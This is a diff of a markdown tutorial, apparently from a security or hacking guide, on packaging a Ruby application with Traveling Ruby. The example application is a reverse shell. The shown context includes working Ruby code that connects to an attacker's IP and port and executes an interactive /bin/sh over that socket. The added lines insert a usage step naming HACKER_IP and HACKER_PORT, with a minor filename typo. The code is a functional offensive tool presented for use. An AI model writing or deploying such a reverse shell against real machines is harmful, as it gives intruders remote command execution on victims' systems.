@@ -15,7 +15,8 @@ From official site "*Traveling Ruby is a project which supplies self-contained, 
 mkdir rshell
 cd rshell
 ```
-Create your application -in our case, reverse shell- 
+- Create your application -in our case, reverse shell- in "rshell" folder
+
 **rshell.rb**
 ```ruby
 #!/usr/bin/env ruby
@@ -28,6 +29,14 @@ ip, port = ARGV
 s = TCPSocket.open(ip,port).to_i
 exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
 ```
+
+- Test it 
+
+```
+ruby rshell.rb 
+# => ruby rshell.rb.rb [HACKER_IP  HACKER_PORT]
+```
+
 
 
 ##### Creating package directories
